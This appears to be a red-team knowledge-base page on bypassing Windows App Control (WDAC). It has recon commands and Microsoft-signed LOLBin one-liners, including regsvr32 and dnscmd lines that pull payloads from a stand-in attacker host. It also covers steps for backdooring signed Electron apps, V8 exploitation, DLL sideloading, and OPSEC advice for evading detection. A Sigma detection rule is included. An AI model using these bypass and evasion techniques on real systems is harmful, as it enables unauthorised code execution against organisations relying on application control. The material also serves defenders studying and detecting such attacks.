# WDAC / App Control for Business Bypass

Cluster on defeating **application control** — WDAC, now branded **App Control for Business**.
WDAC enforces code integrity policy at kernel level: only code matching an allow rule runs.
Bypasses come from (a) Microsoft-signed binaries that execute arbitrary logic (LOLBins on the
"Applications that can bypass WDAC" list), (b) backdooring Microsoft-signed Electron/V8 apps, and
(c) sideloading into trusted images. Critical caveat: a *deny* rule alone is not the last line of
defense — the *allow* list is (see "Allow-list reality check").

## Theory / Mechanism

WDAC policy (`SIPolicy.p7b`, compiled from XML) defines allow rules by Publisher, FilePath,
Hash, FileName, or PcaCertificate, plus Microsoft's recommended **block rules** for known-abusable
signed binaries. Modes: Audit (log only, CodeIntegrity EID 3076) vs Enforced (block, EID 3077).
Managed-installer and ISG (Intelligent Security Graph) can auto-allow reputable code.

### Recon
```powershell
# Is WDAC active and in what mode?
$d = CITool.exe --list-policies   # Win11; lists active base/supplemental policies + enforcement
Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard |
  Select-Object CodeIntegrityPolicyEnforcementStatus, UsermodeCodeIntegrityPolicyEnforcementStatus
# 2 = Enforced, 1 = Audit, 0 = Off
# Inspect deployed policy XML/binary for weak rules (FileName/path allows, broad publishers)
Get-CIPolicy -FilePath C:\Windows\System32\CodeIntegrity\SIPolicy.p7b 2>$null
```
`scripts/mitigation_recon.ps1` reports WDAC enforcement state for usermode + kernel-mode CI.

## Bypass Techniques

### 1. Recommended-block-rule LOLBins (signed-by-Microsoft, run arbitrary code)
These ship signed by Microsoft, so a policy that allows "all Microsoft-signed" (common, naive
config) lets them run; they then execute attacker logic:
```cmd
:: MSBuild — compiles & runs inline C#/MSBuild task from a project file
MSBuild.exe payload.csproj

:: mshta — executes HTML application / JScript / VBScript
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run(""calc"")(window.close)")

:: cmstp — COM scriptlet via crafted INF
cmstp.exe /s payload.inf

:: InstallUtil — runs code in the [Uninstall] path, evading normal entrypoint
InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

:: regsvr32 (Squiblydoo) — remote scriptlet
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll

:: dnscmd — loads attacker DLL as a DNS server-level plugin (needs DNS-admin context)
dnscmd /config /serverlevelplugindll \\attacker\share\payload.dll
```
The full, maintained catalogue is bohops' UltimateWDACBypassList and the LOLBAS project (which
contains bypasses *not yet* on Microsoft's block list — e.g. legacy Teams, below).

### 2. Backdooring signed Electron apps — Loki C2 (IBM X-Force, 2024)
Microsoft-signed Electron apps (notably **legacy Microsoft Teams**) bypass even strict WDAC
because the executable is Microsoft-signed. The trick: Electron loads JavaScript from `app.asar`
/ `main.js`, which is *not* signed — replace it with your payload. IBM X-Force's Bobby Cooke
open-sourced this as **Loki C2** (April 2024).
```bash
# Repackage a Microsoft-signed Electron app's asar with attacker main.js
npx asar extract app.asar app_unpacked
# overwrite app_unpacked/main.js (or main entry in package.json) with Loki/JS payload
npx asar pack app_unpacked app.asar
# launch the original SIGNED Electron exe -> WDAC allows it -> runs your JS
```
Limitation: pure JS only (no native DLL/EXE/shellcode directly).

### 3. Signed Node `.node` module + V8 exploitation — native shellcode (IBM X-Force, 2025)
To escape the JS-only limit, abuse a **Microsoft-signed native Node module**, e.g.
`windows_process_tree.node` bundled with VS Code, to reach native code; or replace `main.js` with
a **V8 exploit** targeting the (often outdated) V8 bundled in the trusted Electron app to get
native shellcode execution. Bonus EDR evasion: shellcode in a browser-like process is
unremarkable — RWX JIT memory is expected there.

### 4. DLL sideloading into a trusted/allowed image
Find an allowed application that resolves a DLL from a user-writable directory (Process Monitor
filter: `Result is NAME NOT FOUND` and `Path ends with .dll`), drop a malicious DLL there; the
trusted app loads it and your code runs under its allowed identity. WDAC governs the loading EXE,
but a hijacked DLL search-order in that EXE can still execute attacker code if the DLL satisfies
(or evades) the user-mode CI rule set.

## Allow-list reality check (defensive counterpoint — and offensive guidance)

Circumventing a *deny* rule does not by itself make a binary run: the allow rules are the real
gate. A binary with a patched `OriginalFileName` may dodge a FileName-based deny rule, but it
still must satisfy an allow rule. So target policies that allow broadly (all-Microsoft-signed,
broad publisher, path allows on writable dirs). Against a tight allow-list (hash/path of an
explicit set), prefer LOLBins that are *already on the allow-list* and sideloading into them, or
the signed-Electron/Node approach (the signed EXE is on the allow-list; the unsigned JS/asar is
what you control). (Source: appcontrol.ai "Signed, Trusted, Abused".)

## Detection

```yaml
title: WDAC Bypass - Signed LOLBin Executing Untrusted Content
id: 7e2a9c4d-3b1f-4a6e-9c8d-1f2e3a4b5c6d
status: stable
logsource:
  product: windows
  category: process_creation     # EID 4688 / Sysmon 1
detection:
  lolbins:
    Image|endswith:
      - '\MSBuild.exe'
      - '\mshta.exe'
      - '\cmstp.exe'
      - '\InstallUtil.exe'
      - '\regsvr32.exe'
  suspicious_parent:
    ParentImage|endswith:
      - '\winword.exe'
      - '\excel.exe'
      - '\outlook.exe'
      - '\explorer.exe'
  net_or_script:
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'scrobj.dll'
      - '/U '
  condition: lolbins and (suspicious_parent or net_or_script)
fields: [Image, CommandLine, ParentImage]
falsepositives: [build servers (MSBuild), legit installers]
level: high
```
Also monitor: **CodeIntegrity Operational** EID 3076 (audit block) / 3077 (enforced block) — a
spike of 3076 indicates someone probing what the policy blocks; signed-Electron tamper shows as a
modified `app.asar`/`main.js` hash next to a Microsoft-signed exe; DLL sideloading shows image
loads from `%APPDATA%`/`%TEMP%` by a trusted parent.

## OPSEC

- LOLBins with network args + Office/Explorer parents are top Sigma signatures — prefer the
  signed-Electron/Node route which produces *expected* process trees (Teams launching its helper).
- Tampered `app.asar`/`main.js` changes file hashes; if the org integrity-monitors app dirs, stage
  in a per-user copy of the app rather than the system install.
- Audit-mode WDAC silently logs your bypass (EID 3076) even when it "works" — verify enforcement
  vs audit during recon; treat audit as full visibility.
- DLL sideload: place the DLL in the app's own per-user dir, match the expected filename, and
  proxy real exports to avoid crashing the host (and the resulting WER noise).

## References

- bohops — *UltimateWDACBypassList* (canonical LOLBin/bypass catalogue): https://github.com/bohops/UltimateWDACBypassList
- IBM X-Force — *Bypassing Windows Defender Application Control with Loki C2* (signed Electron, 2024): https://www.ibm.com/think/x-force/bypassing-windows-defender-application-control-loki-c2
- IBM X-Force — *Operationalizing browser exploits to bypass WDAC* (signed Node `.node` + V8, 2025): https://www.ibm.com/think/x-force/operationalizing-browser-exploits-to-bypass-wdac
- appcontrol.ai — *Signed, Trusted, Abused: Making Sense of WDAC's Recommended Block Rules* (allow-list reality): https://www.appcontrol.ai/post/signed-trusted-abused-making-sense-of-wdac-s-recommended-block-rules
- Microsoft Learn — *Applications that can bypass App Control / recommended block rules*: https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol
